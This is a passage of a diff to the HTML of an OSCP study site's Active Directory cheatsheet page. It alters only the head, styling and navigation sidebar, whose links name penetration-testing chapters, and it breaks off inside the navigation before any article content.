@@ -1,12 +1,12 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="color-scheme" content="light"><title>Active Directory Cheatsheet — OSCP Reference</title><meta name="description" content="Plain OSCP reference: commands, explanations, interpretation and next checks."><link rel="canonical" href="https://armaanleg3nd.github.io/oscp/cheatsheets/active-directory/"><style>:root{color-scheme:light}html{color:#000;background:#fff;scroll-padding-top:1rem}body{margin:0;font:17px/1.5 Times New Roman,Times,serif}a,a:visited{color:#00e;text-decoration:underline}a:focus-visible,summary:focus-visible{outline-offset:3px;outline:2px solid #000}#reference-index{box-sizing:border-box;background:#fff;border-right:1px solid #888;width:19rem;padding:.75rem 1rem;position:fixed;inset:0 auto 0 0;overflow:auto}#reference-index>p:first-child{margin-top:0}nav{overflow-wrap:anywhere;font-size:15px;line-height:1.4}nav ul{margin:.35rem 0;padding-left:1.15rem}nav>ul{padding-left:1rem}nav li{margin:.3rem 0}nav summary{cursor:pointer}nav [aria-current=page]{font-weight:700}main{min-width:0;margin-left:19rem;padding:1rem 2rem 3rem}article{overflow-wrap:anywhere;min-width:0;max-width:85ch}h1{font-size:2em;line-height:1.15}h2{margin-top:1.7em;font-size:1.5em}h3{margin-top:1.5em;font-size:1.2em}h4,h5,h6{margin-top:1.3em;font-size:1em}pre,code{font-family:Courier New,Courier,monospace;font-size:.9em}pre{white-space:pre;overflow-wrap:normal;background:#f5f5f5;border:1px solid #aaa;padding:.7rem;overflow-x:auto}table{border-collapse:collapse;max-width:100%;margin:1rem 0;display:block;overflow-x:auto}th,td{vertical-align:top;text-align:left;border:1px solid #aaa;padding:.35rem .55rem}th{background:#eee}blockquote{border-left:2px solid #aaa;margin-left:0;padding-left:1rem}img,svg{max-width:100%;height:auto}article details{margin:1rem 0}article summary{cursor:pointer}.skip{z-index:2;background:#fff;padding:.5rem;position:fixed;top:0;left:-10000px}.skip:focus{left:0}@media (width<=700px){html{scroll-padding-top:calc(32dvh + 1rem)}#reference-index{z-index:1;border-bottom:1px solid #888;border-right:0;width:100%;height:32dvh;inset:0 0 auto}main{margin-left:0;padding:calc(32dvh + 1rem) 1rem 2rem}body{font-size:16px}}
-</style></head><body><a class="skip" href="#document">Skip to document</a><aside id="reference-index"><p><strong><a href="/oscp/">OSCP Reference</a></strong></p><nav aria-label="Reference index"><p><a href="/oscp/notes/ad-investigation/">AD Notes</a> · <a href="/oscp/notes/ad-investigation/quick-reference/">AD quick reference</a></p><details open><summary>On this page</summary><ul><li><a href="/oscp/cheatsheets/active-directory/#state-line">State line</a></li><li><a href="/oscp/cheatsheets/active-directory/#domaindc-truth">Domain/DC truth</a></li><li><a href="/oscp/cheatsheets/active-directory/#native--rsat--adsi">Native / RSAT / ADSI</a></li><li><a href="/oscp/cheatsheets/active-directory/#authenticated-ldap">Authenticated LDAP</a></li><li><a href="/oscp/cheatsheets/active-directory/#powerview">PowerView</a></li><li><a href="/oscp/cheatsheets/active-directory/#shares--sysvol--netlogon">Shares / SYSVOL / NETLOGON</a></li><li><a href="/oscp/cheatsheets/active-directory/#spns-acls-host-rights-and-sessions">SPNs, ACLs, host rights and sessions</a></li><li><a href="/oscp/cheatsheets/active-directory/#bloodhound-collection-and-decision">BloodHound collection and decision</a></li><li><a href="/oscp/cheatsheets/active-directory/#as-rep-roast">AS-REP roast</a></li><li><a href="/oscp/cheatsheets/active-directory/#kerberoast">Kerberoast</a><ul><li><a href="/oscp/cheatsheets/active-directory/#targeted-kerberoast-from-spn-write">Targeted Kerberoast from SPN write</a></li></ul></li><li><a href="/oscp/cheatsheets/active-directory/#tickets">Tickets</a><ul><li><a href="/oscp/cheatsheets/active-directory/#silver-ticket">Silver ticket</a></li></ul></li><li><a href="/oscp/cheatsheets/active-directory/#credential-access">Credential access</a></li><li><a href="/oscp/cheatsheets/active-directory/#acl-backed-identity-transitions">ACL-backed identity transitions</a></li><li><a href="/oscp/cheatsheets/active-directory/#dcsync">DCSync</a></li><li><a href="/oscp/cheatsheets/active-directory/#conditional-ad-cs">Conditional: AD CS</a></li><li><a href="/oscp/cheatsheets/active-directory/#lateral-movement-chooser">Lateral movement chooser</a><ul><li><a href="/oscp/cheatsheets/active-directory/#preflight-and-credential-classification">Preflight and credential classification</a></li><li><a href="/oscp/cheatsheets/active-directory/#smb-services-and-scheduled-tasks">SMB, services and scheduled tasks</a></li><li><a href="/oscp/cheatsheets/active-directory/#wmidcom">WMI/DCOM</a></li><li><a href="/oscp/cheatsheets/active-directory/#kerberos-cache">Kerberos cache</a></li><li><a href="/oscp/cheatsheets/active-directory/#winrm-and-rdp">WinRM and RDP</a></li><li><a href="/oscp/cheatsheets/active-directory/#key-and-ticket-transitions">Key and ticket transitions</a></li></ul></li><li><a href="/oscp/cheatsheets/active-directory/#re-enumerate">Re-enumerate</a></li><li><a href="/oscp/cheatsheets/active-directory/#discover-and-recognize-candidates">Discover and recognize candidates</a><ul><li><a href="/oscp/cheatsheets/active-directory/#map-active-directory-attack-paths">Map Active Directory attack paths</a></li><li><a href="/oscp/cheatsheets/active-directory/#gain-a-more-useful-domain-identity">Gain a more useful domain identity</a></li><li><a href="/oscp/cheatsheets/active-directory/#move-to-another-host">Move to another host</a></li></ul></li></ul></details><ul><li><details><summary>Operational procedures</summary><ul><li><details><summary><a href="/oscp/reference/01-discovery-scanning/">01 — Discovery and scanning</a></summary><ul><li><a href="/oscp/reference/01-discovery-scanning/01-path-and-host-discovery/">Path and Host Discovery</a></li><li><a href="/oscp/reference/01-discovery-scanning/02-tcp-scanning/">TCP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/03-service-identification/">Service Identification</a></li><li><a href="/oscp/reference/01-discovery-scanning/04-udp-scanning/">UDP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/05-results-and-next-actions/">Scan Results and Next Actions</a></li><li><a href="/oscp/reference/01-discovery-scanning/06-windows-network-checks/">Windows Network Checks</a></li><li><a href="/oscp/reference/01-discovery-scanning/07-scanner-alternatives/">Scanner Alternatives and Web Baseline Checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/02-service-enumeration/">02 — Service enumeration</a></summary><ul><li><a href="/oscp/reference/02-service-enumeration/01-ftp/">FTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/02-ssh/">SSH Enumeration and Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/03-smtp/">SMTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/04-dns/">DNS Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/05-nfs-rpc/">NFS and Unix RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/06-smb-rpc/">SMB and MS-RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/07-snmp/">SNMP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/08-databases/">Database Enumeration and Privilege Boundaries</a></li><li><a href="/oscp/reference/02-service-enumeration/09-windows-remote-access/">Windows Remote-Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/10-http-web-mapping/">HTTP and Web Application Mapping</a></li><li><a href="/oscp/reference/02-service-enumeration/11-ldap-kerberos/">LDAP and Kerberos Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/12-sip-irc/">SIP and IRC Triage</a></li><li><a href="/oscp/reference/02-service-enumeration/13-memcached-webdav/">Memcached and WebDAV</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/03-initial-access/">03 — Initial access</a></summary><ul><li><a href="/oscp/reference/03-initial-access/01-rdp-access/">RDP Access</a></li><li><a href="/oscp/reference/03-initial-access/02-web-file-handling/">Web File Read, Inclusion and Upload Paths</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/">Command and Manual SQL Injection</a></li><li><a href="/oscp/reference/03-initial-access/04-access-control-and-xss/">Web Access Control, API Logic and XSS</a></li><li><a href="/oscp/reference/03-initial-access/05-wordpress-and-ssrf/">WordPress and SSRF Paths</a></li><li><a href="/oscp/reference/03-initial-access/06-public-exploit-adaptation/">Public Exploit Selection and Adaptation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/04-shells-transfers-credentials/">04 — Shells, transfers and credentials</a></summary><ul><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">File Transfer</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/">Shells, Payloads and Session Repair</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">Credential Classification, Cracking and Reuse</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/04-file-and-repository-hunting/">File and Repository Hunting</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/05-python-tool-environments/">Python Tool Environments</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">Payload Execution Obstacles</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/05-local-privilege-escalation/">05 — Local privilege escalation</a></summary><ul><li><a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/">Linux Privilege Escalation</a></li><li><a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/">Windows Privilege Escalation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/06-ad-lateral-movement/">06 — AD and lateral movement</a></summary><ul><li><a href="/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">Active Directory Domain Mapping</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/">Windows and Domain Credential Access</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/">Kerberos and Identity Transitions</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/">Object Control, AD CS and Domain Compromise</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/05-lateral-movement/">Lateral Movement</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/">Conditional AD infrastructure and trust checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/07-pivoting-tunneling/">07 — Pivoting and tunneling</a></summary><ul><li><a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/">Tunneling and Port Forwarding</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/08-evidence-reporting/">08 — Evidence and reporting</a></summary><ul><li><a href="/oscp/reference/08-evidence-reporting/01-attack-tracking-and-evidence/">Integrated Attack Tracking and Evidence</a></li></ul></details></li><li><a href="/oscp/reference/INDEX/">Complete operational task index</a></li></ul></details></li><li><details open><summary><a href="/oscp/cheatsheets/">Cheatsheets</a></summary><ul><li><a href="/oscp/cheatsheets/active-directory/" aria-current="page">Active Directory Cheatsheet</a></li><li><a href="/oscp/cheatsheets/ad-investigation/">AD Investigation — Where to Look and What Output Means</a></li><li><a href="/oscp/cheatsheets/credentials-cracking/">Credentials and Cracking Cheatsheet</a></li><li><a href="/oscp/cheatsheets/discovery-scanning/">Discovery and Scanning Cheatsheet</a></li><li><a href="/oscp/cheatsheets/evidence-reporting/">Integrated Attack and Reporting Cheatsheet</a></li><li><a href="/oscp/cheatsheets/linux-privesc/">Linux Privilege Escalation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/payload-execution/">Payload Execution Obstacles Cheatsheet</a></li><li><a href="/oscp/cheatsheets/pivoting/">Pivoting and Tunneling Cheatsheet</a></li><li><a href="/oscp/cheatsheets/public-exploits/">Public Exploit Adaptation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/service-opportunities/">Service Opportunity Cheatsheet</a></li><li><a href="/oscp/cheatsheets/shells-payloads/">Shells and Payloads Cheatsheet</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/">Tool Command Reference</a></li><li><a href="/oscp/cheatsheets/tool-selection/">Tool Selection Matrix</a></li><li><a href="/oscp/cheatsheets/tools-and-scripts/">Tools and scripts by task</a></li><li><a href="/oscp/cheatsheets/web-exploitation/">Web Exploitation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/web-mapping/">Web Mapping Cheatsheet</a></li><li><a href="/oscp/cheatsheets/windows-privesc/">Windows Privilege Escalation Cheatsheet</a></li></ul></details></li><li><details><summary>Study notes</summary><ul><li><a href="/oscp/notes/Attack_Strategy_Map/">Attack Strategy Map</a></li><li><a href="/oscp/notes/GetSH_Coverage/">getSH Source Coverage</a></li><li><a href="/oscp/notes/Master_Notes/">Master Notes</a></li><li><a href="/oscp/notes/Recognition_Practice/">Recognition practice</a></li><li><a href="/oscp/notes/Speedrun_Breakdown/">Attack-first OSCP speedrun breakdown</a></li><li><details><summary><a href="/oscp/notes/ad-investigation/">AD Notes — focused checks</a></summary><ul><li><a href="/oscp/notes/ad-investigation/acl/">An ACL shows a powerful right — can I actually use it?</a></li><li><a href="/oscp/notes/ad-investigation/asrep/">Can this account produce AS-REP roasting material?</a></li><li><a href="/oscp/notes/ad-investigation/bloodhound/">How do I turn a BloodHound graph into a verified path?</a></li><li><a href="/oscp/notes/ad-investigation/conditional/">When should I investigate AD CS, delegation or GPOs?</a></li><li><a href="/oscp/notes/ad-investigation/context/">What identity and domain am I actually using?</a></li><li><a href="/oscp/notes/ad-investigation/credential-sources/">On a controlled host, where could useful credentials exist?</a></li><li><a href="/oscp/notes/ad-investigation/failure/">A command failed or returned nothing — what can I conclude?</a></li><li><a href="/oscp/notes/ad-investigation/files/">I found a script or configuration file — what matters?</a></li><li><a href="/oscp/notes/ad-investigation/hosts/">Which computers can this identity access?</a></li><li><a href="/oscp/notes/ad-investigation/kerberoast/">I found a service account — is Kerberoasting useful?</a></li><li><a href="/oscp/notes/ad-investigation/managed/">Can I read a LAPS or gMSA secret?</a></li><li><a href="/oscp/notes/ad-investigation/material/">I found a secret — what kind is it and where can I use it?</a></li><li><a href="/oscp/notes/ad-investigation/movement/">I have credentials — which remote-access method fits?</a></li><li><a href="/oscp/notes/ad-investigation/object-change/">Which identity change follows from a validated object right?</a></li><li><a href="/oscp/notes/ad-investigation/policy/">How do I interpret password policy before testing credentials?</a></li><li><a href="/oscp/notes/ad-investigation/quick-reference/">AD — Quick Reference</a></li><li><a href="/oscp/notes/ad-investigation/read-output/">How to read command output</a></li><li><a href="/oscp/notes/ad-investigation/reenumerate/">I gained a new account or host — what do I check again?</a></li><li><a href="/oscp/notes/ad-investigation/replication/">Does this identity really have DCSync rights?</a></li><li><a href="/oscp/notes/ad-investigation/routes/">Is this an access failure or a missing route?</a></li><li><a href="/oscp/notes/ad-investigation/secure-baseline/">Expected behavior or useful weakness?</a></li><li><a href="/oscp/notes/ad-investigation/sessions/">A privileged user has a session — what does that mean?</a></li><li><a href="/oscp/notes/ad-investigation/shares/">Which shares and files should I inspect first?</a></li><li><a href="/oscp/notes/ad-investigation/smb-wmi/">SMB or WMI execution — what must be true first?</a></li><li><a href="/oscp/notes/ad-investigation/spns/">What does an SPN tell me to investigate?</a></li><li><a href="/oscp/notes/ad-investigation/tickets/">What does this Kerberos ticket actually allow?</a></li><li><a href="/oscp/notes/ad-investigation/users/">Where do I find useful users and group memberships?</a></li><li><a href="/oscp/notes/ad-investigation/winrm/">WinRM or RDP — why would this account be allowed in?</a></li></ul></details></li><li><details><summary>Method guides</summary><ul><li><a href="/oscp/notes/methods/ad-identities/">Gain a more useful domain identity</a></li><li><a href="/oscp/notes/methods/ad-mapping/">Map Active Directory attack paths</a></li><li><a href="/oscp/notes/methods/credentials/">Recover and use authentication material</a></li><li><a href="/oscp/notes/methods/discovery/">Discover attack surfaces</a></li><li><a href="/oscp/notes/methods/execution/">Resolve payload execution obstacles</a></li><li><a href="/oscp/notes/methods/integration/">Complete attacks and retain reproducible evidence</a></li><li><a href="/oscp/notes/methods/lateral-movement/">Move to another host</a></li><li><a href="/oscp/notes/methods/linux-privesc/">Escalate privileges on Linux</a></li><li><a href="/oscp/notes/methods/pivoting/">Reach internal services</a></li><li><a href="/oscp/notes/methods/public-exploits/">Select and adapt public exploits</a></li><li><a href="/oscp/notes/methods/services/">Extract opportunities from services</a></li><li><a href="/oscp/notes/methods/sessions-transfers/">Establish sessions and move files</a></li><li><a href="/oscp/notes/methods/web-exploitation/">Turn application weaknesses into access</a></li><li><a href="/oscp/notes/methods/web-mapping/">Map useful web behavior</a></li><li><a href="/oscp/notes/methods/windows-privesc/">Escalate privileges on Windows</a></li></ul></details></li></ul></details></li></ul></nav><hr><p><a href="/">Website</a> · <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference">Source</a></p></aside><main id="document" tabindex="-1"><article><h1 id="active-directory-cheatsheet">Active Directory Cheatsheet</h1>
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="color-scheme" content="light"><title>Active Directory Cheatsheet — OSCP Reference</title><meta name="description" content="Numbered OSCP chapters, baselines, variants and result-specific next sections."><link rel="canonical" href="https://armaanleg3nd.github.io/oscp/cheatsheets/active-directory/"><style>:root{color-scheme:light}html{color:#000;background:#fff;scroll-padding-top:1rem}body{margin:0;font:17px/1.5 Times New Roman,Times,serif}a,a:visited{color:#00e;text-decoration:underline}a:focus-visible,summary:focus-visible{outline-offset:3px;outline:2px solid #000}aside{box-sizing:border-box;background:#fff;padding:.75rem 1rem;position:fixed;top:0;bottom:0;overflow:auto}#reference-index{border-right:1px solid #888;width:18rem;left:0}#page-index{border-left:1px solid #888;width:18rem;right:0}aside>p:first-child{margin-top:0}nav{overflow-wrap:anywhere;font-size:14px;line-height:1.4}nav ul{margin:.35rem 0;padding-left:1rem}nav li{margin:.3rem 0}nav summary,article summary{cursor:pointer}nav [aria-current=page]{font-weight:700}main{min-width:0;margin:0 18rem;padding:1rem 1.5rem 3rem}article{overflow-wrap:anywhere;min-width:0;max-width:85ch}h1{font-size:1.9em;line-height:1.2}h2{margin-top:1.7em;font-size:1.45em}h3{margin-top:1.5em;font-size:1.15em}h4,h5,h6{margin-top:1.3em;font-size:1em}pre,code{font-family:Courier New,Courier,monospace;font-size:.9em}pre{white-space:pre;overflow-wrap:normal;background:#f5f5f5;border:1px solid #aaa;padding:.7rem;overflow-x:auto}table{border-collapse:collapse;max-width:100%;margin:1rem 0;display:block;overflow-x:auto}th,td{vertical-align:top;text-align:left;border:1px solid #aaa;padding:.35rem .55rem}th{background:#eee}blockquote{border-left:2px solid #aaa;margin-left:0;padding-left:1rem}img,svg{max-width:100%;height:auto}article details{margin:1rem 0}.skip{z-index:3;background:#fff;padding:.5rem;position:fixed;top:0;left:-10000px}.skip:focus{left:0}@media (width>=761px) and (width<=1150px){#reference-index{width:14rem}#page-index{width:15rem}main{margin-left:14rem;margin-right:15rem}}@media (width<=760px){html{scroll-padding-top:calc(30dvh + 1rem)}aside{z-index:1;height:30dvh;padding:.5rem;top:0;bottom:auto}#reference-index{border-bottom:1px solid #888;width:50%;left:0}#page-index{border-bottom:1px solid #888;border-left:0;width:50%;right:0}main{margin:0;padding:calc(30dvh + 1rem) 1rem 2rem}body{font-size:16px}nav{font-size:13px}}
+</style></head><body><a class="skip" href="#document">Skip to document</a><aside id="reference-index"><p><strong><a href="/oscp/">OSCP Reference</a></strong></p><nav aria-label="Reference index"><ul><li><details><summary>0 Start and shared concepts</summary><ul><li><a href="/oscp/">0.0 OSCP Exploitation Reference</a></li><li><a href="/oscp/notes/Master_Notes/">0.1 Master Notes</a></li><li><a href="/oscp/notes/Attack_Strategy_Map/">0.2 Attack Strategy Map</a></li><li><a href="/oscp/notes/Speedrun_Breakdown/">0.3 Attack-first OSCP speedrun breakdown</a></li><li><a href="/oscp/notes/Recognition_Practice/">0.4 Recognition practice</a></li><li><a href="/oscp/notes/GetSH_Coverage/">0.5 getSH Source Coverage</a></li></ul></details></li><li><details><summary>1 Surface to opportunity</summary><ul><li><a href="/oscp/notes/methods/discovery/">1.1 Discover attack surfaces</a></li><li><a href="/oscp/notes/methods/services/">1.2 Extract opportunities from services</a></li></ul></details></li><li><details><summary>2 Web behavior to access</summary><ul><li><a href="/oscp/notes/methods/web-mapping/">2.1 Map useful web behavior</a></li><li><a href="/oscp/notes/methods/web-exploitation/">2.2 Turn application weaknesses into access</a></li></ul></details></li><li><details><summary>3 Credentials and keys</summary><ul><li><a href="/oscp/notes/methods/credentials/">3.1 Recover and use authentication material</a></li></ul></details></li><li><details><summary>4 Public exploits and reliable sessions</summary><ul><li><a href="/oscp/notes/methods/public-exploits/">4.1 Select and adapt public exploits</a></li><li><a href="/oscp/notes/methods/sessions-transfers/">4.2 Establish sessions and move files</a></li></ul></details></li><li><details><summary>5 Local privilege escalation</summary><ul><li><a href="/oscp/notes/methods/linux-privesc/">5.1 Escalate privileges on Linux</a></li><li><a href="/oscp/notes/methods/windows-privesc/">5.2 Escalate privileges on Windows</a></li></ul></details></li><li><details><summary><a href="/oscp/notes/ad-investigation/">6 Active Directory</a></summary><ul><li><a href="/oscp/notes/ad-investigation/quick-reference/">6.0 AD quick reference</a></li><li><details><summary><a href="/oscp/notes/ad-investigation/chapter-6-1/">6.1 Connectivity and domain context</a></summary><ul><li><a href="/oscp/notes/ad-investigation/context/">6.1.1 Establish the current identity and domain</a></li><li><a href="/oscp/notes/ad-investigation/routes/">6.1.2 Validate routes, naming and pivot connectivity</a></li><li><a href="/oscp/notes/methods/pivoting/">6.1.3 Reach internal services</a></li></ul></details></li><li><details><summary><a href="/oscp/notes/ad-investigation/chapter-6-2/">6.2 Enumeration</a></summary><ul><li><a href="/oscp/notes/ad-investigation/users/">6.2.1 Baseline enumeration — users and groups</a></li><li><a href="/oscp/notes/ad-investigation/shares/">6.2.2 Enumerate shares, SYSVOL and NETLOGON</a></li><li><a href="/oscp/notes/ad-investigation/files/">6.2.3 Interpret scripts, configuration and exposed secrets</a></li><li><a href="/oscp/notes/ad-investigation/spns/">6.2.4 Enumerate service accounts and SPNs</a></li><li><a href="/oscp/notes/ad-investigation/acl/">6.2.5 Enumerate and validate effective object permissions</a></li><li><a href="/oscp/notes/ad-investigation/hosts/">6.2.6 Validate host-specific access rights</a></li><li><a href="/oscp/notes/ad-investigation/sessions/">6.2.7 Enumerate and interpret sessions</a></li><li><a href="/oscp/notes/ad-investigation/bloodhound/">6.2.8 Enumerate using BloodHound and validate relationships</a></li><li><a href="/oscp/notes/methods/ad-mapping/">6.2.9 Map Active Directory attack paths</a></li></ul></details></li><li><details><summary><a href="/oscp/notes/ad-investigation/chapter-6-3/">6.3 Credentials and identity changes</a></summary><ul><li><a href="/oscp/notes/ad-investigation/policy/">6.3.1 Interpret password policy before credential validation</a></li><li><a href="/oscp/notes/ad-investigation/material/">6.3.2 Classify recovered credentials and their scope</a></li><li><a href="/oscp/notes/ad-investigation/asrep/">6.3.3 AS-REP roasting — conditions and output</a></li><li><a href="/oscp/notes/ad-investigation/kerberoast/">6.3.4 Kerberoasting — selection and output</a></li><li><a href="/oscp/notes/ad-investigation/credential-sources/">6.3.5 Select a credential source on a controlled host</a></li><li><a href="/oscp/notes/ad-investigation/tickets/">6.3.6 Inspect Kerberos tickets and compatible use</a></li><li><a href="/oscp/notes/ad-investigation/object-change/">6.3.7 Choose a permission-backed identity transition</a></li><li><a href="/oscp/notes/ad-investigation/managed/">6.3.8 Validate LAPS and gMSA read access</a></li><li><a href="/oscp/notes/ad-investigation/replication/">6.3.9 Validate domain replication rights</a></li><li><a href="/oscp/notes/ad-investigation/conditional/">6.3.10 Select an AD CS, delegation or GPO branch</a></li><li><a href="/oscp/notes/methods/ad-identities/">6.3.11 Gain a more useful domain identity</a></li></ul></details></li><li><details><summary><a href="/oscp/notes/ad-investigation/chapter-6-4/">6.4 Lateral movement</a></summary><ul><li><a href="/oscp/notes/ad-investigation/movement/">6.4.1 Select a compatible remote-access mechanism</a></li><li><a href="/oscp/notes/ad-investigation/winrm/">6.4.2 Access using WinRM or RDP</a></li><li><a href="/oscp/notes/ad-investigation/smb-wmi/">6.4.3 Execute using SMB or WMI mechanisms</a></li><li><a href="/oscp/notes/methods/lateral-movement/">6.4.4 Move to another host</a></li></ul></details></li><li><details><summary><a href="/oscp/notes/ad-investigation/chapter-6-5/">6.5 Interpretation, troubleshooting and re-enumeration</a></summary><ul><li><a href="/oscp/notes/ad-investigation/failure/">6.5.1 Diagnose the failed boundary</a></li><li><a href="/oscp/notes/ad-investigation/reenumerate/">6.5.2 Re-enumerate after an identity or host change</a></li><li><a href="/oscp/notes/ad-investigation/read-output/">6.5.3 Read and classify command output</a></li><li><a href="/oscp/notes/ad-investigation/secure-baseline/">6.5.4 Expected behavior and useful security boundaries</a></li></ul></details></li></ul></details></li><li><details><summary>7 Payload execution and troubleshooting</summary><ul><li><a href="/oscp/notes/methods/execution/">7.1 Resolve payload execution obstacles</a></li></ul></details></li><li><details><summary>8 Integrated attacks and evidence</summary><ul><li><a href="/oscp/notes/methods/integration/">8.1 Complete attacks and retain reproducible evidence</a></li></ul></details></li><li><details><summary>9 Operational procedures</summary><ul><li><a href="/oscp/reference/INDEX/">9.0 Complete operational task index</a></li><li><details><summary>9.1 Discovery and scanning</summary><ul><li><a href="/oscp/reference/01-discovery-scanning/">9.1.0 Stage 01: Discovery and Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/01-path-and-host-discovery/">9.1.1 Path and Host Discovery</a></li><li><a href="/oscp/reference/01-discovery-scanning/02-tcp-scanning/">9.1.2 TCP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/03-service-identification/">9.1.3 Service Identification</a></li><li><a href="/oscp/reference/01-discovery-scanning/04-udp-scanning/">9.1.4 UDP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/05-results-and-next-actions/">9.1.5 Scan Results and Next Actions</a></li><li><a href="/oscp/reference/01-discovery-scanning/06-windows-network-checks/">9.1.6 Windows Network Checks</a></li><li><a href="/oscp/reference/01-discovery-scanning/07-scanner-alternatives/">9.1.7 Scanner Alternatives and Web Baseline Checks</a></li></ul></details></li><li><details><summary>9.2 Service enumeration</summary><ul><li><a href="/oscp/reference/02-service-enumeration/">9.2.0 Stage 02: Service Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/01-ftp/">9.2.1 FTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/02-ssh/">9.2.2 SSH Enumeration and Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/03-smtp/">9.2.3 SMTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/04-dns/">9.2.4 DNS Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/05-nfs-rpc/">9.2.5 NFS and Unix RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/06-smb-rpc/">9.2.6 SMB and MS-RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/07-snmp/">9.2.7 SNMP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/08-databases/">9.2.8 Database Enumeration and Privilege Boundaries</a></li><li><a href="/oscp/reference/02-service-enumeration/09-windows-remote-access/">9.2.9 Windows Remote-Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/10-http-web-mapping/">9.2.10 HTTP and Web Application Mapping</a></li><li><a href="/oscp/reference/02-service-enumeration/11-ldap-kerberos/">9.2.11 LDAP and Kerberos Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/12-sip-irc/">9.2.12 SIP and IRC Triage</a></li><li><a href="/oscp/reference/02-service-enumeration/13-memcached-webdav/">9.2.13 Memcached and WebDAV</a></li></ul></details></li><li><details><summary>9.3 Initial access</summary><ul><li><a href="/oscp/reference/03-initial-access/">9.3.0 Stage 03: Initial Access</a></li><li><a href="/oscp/reference/03-initial-access/01-rdp-access/">9.3.1 RDP Access</a></li><li><a href="/oscp/reference/03-initial-access/02-web-file-handling/">9.3.2 Web File Read, Inclusion and Upload Paths</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/">9.3.3 Command and Manual SQL Injection</a></li><li><a href="/oscp/reference/03-initial-access/04-access-control-and-xss/">9.3.4 Web Access Control, API Logic and XSS</a></li><li><a href="/oscp/reference/03-initial-access/05-wordpress-and-ssrf/">9.3.5 WordPress and SSRF Paths</a></li><li><a href="/oscp/reference/03-initial-access/06-public-exploit-adaptation/">9.3.6 Public Exploit Selection and Adaptation</a></li></ul></details></li><li><details><summary>9.4 Shells, transfers and credentials</summary><ul><li><a href="/oscp/reference/04-shells-transfers-credentials/">9.4.0 Stage 04: Shells, Transfers and Credentials</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">9.4.1 File Transfer</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/">9.4.2 Shells, Payloads and Session Repair</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">9.4.3 Credential Classification, Cracking and Reuse</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/04-file-and-repository-hunting/">9.4.4 File and Repository Hunting</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/05-python-tool-environments/">9.4.5 Python Tool Environments</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">9.4.6 Payload Execution Obstacles</a></li></ul></details></li><li><details><summary>9.5 Local privilege escalation</summary><ul><li><a href="/oscp/reference/05-local-privilege-escalation/">9.5.0 Stage 05: Local Privilege Escalation</a></li><li><a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/">9.5.1 Linux Privilege Escalation</a></li><li><a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/">9.5.2 Windows Privilege Escalation</a></li></ul></details></li><li><details><summary>9.6 AD and lateral movement</summary><ul><li><a href="/oscp/reference/06-ad-lateral-movement/">9.6.0 Stage 06: Active Directory and Lateral Movement</a></li><li><a 